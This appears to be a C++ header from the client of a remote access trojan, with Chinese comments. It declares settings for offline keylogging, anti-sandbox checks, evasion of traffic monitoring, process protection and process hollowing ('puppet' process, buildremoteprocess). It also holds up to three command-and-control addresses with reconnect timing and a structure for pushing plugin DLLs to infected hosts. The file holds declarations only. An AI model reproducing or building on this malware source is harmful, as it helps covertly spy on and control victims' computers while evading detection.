#pragma once
#include "stdafx.h"
#include "Manager.h"


class CKernelManager;
enum  KernelManager
{
	COMMAND_ACTIVED,
};

struct Function
{
	BOOL IsKeyboard;		//键盘离线记录
	BOOL IsAntiSimulation;	//反沙箱
	BOOL ProtectedProcess;	//进程保护
	BOOL antinet;			//反查流量
	BOOL RunDllEntryProc;	//是否运行DLL入口

	BOOL  Processdaemon;	//进程守护
	BOOL  puppet;			//傀儡进程
	BOOL  special;
	BOOL  bool4;	//备用
	BOOL  bool5;	//备用



	TCHAR other1[255];  //备用
	TCHAR other2[255];  //备用
	TCHAR other3[255];  //备用
	TCHAR other4[255];	//备用
	TCHAR other5[255];  //备用
};


struct Info
{
	char mark[30];		//标记
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//端口
	BOOL IsTcp;			//通信模式
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//端口
	BOOL IsTcp2;			//通信模式
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//端口
	BOOL IsTcp3;			//通信模式
	TCHAR szRunSleep[30];	//运行等待（开始运行时等待时间 防止手动查看流量监控）
	TCHAR szHeart[30];		//重连时间
	TCHAR szGroup[50];		//分组
	TCHAR szVersion[50];	//版本
	TCHAR Remark[50];		//备注
	Function otherset;		//其他设置
};


enum SENDTASK
{
	TASK_MAIN,					//普通插件方式 带1个普通导出函数名 不带参数
	TASK_DOEVERYTHING,			//  带字符串参数和长度（被调用者自己解析）
	TASK_ONLY,					//只加载DLL就行
};


struct DllSendDate
{
	SENDTASK sendtask;
	TCHAR DllName[255];			 //DL名称
	BOOL is_64;					//位数
	int DateSize;				//DLL大小
	TCHAR szVersion[50];		//版本
	TCHAR szcommand[1000];
	int i;
};




class CKernelManager : public CManager
{
public:
	virtual ~CKernelManager();
	CKernelManager(ISocketBase* pClient,BOOL bpuppet);
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	VOID runbin();
	BOOL m_bpuppet;
	HANDLE	hWorker;

};


BOOL buildremoteprocess(byte* data, int size, PROCESS_INFORMATION* pi);
bool pid_is_running(DWORD pid);
int memfind(const char* mem, const char* str, int sizem, int sizes);


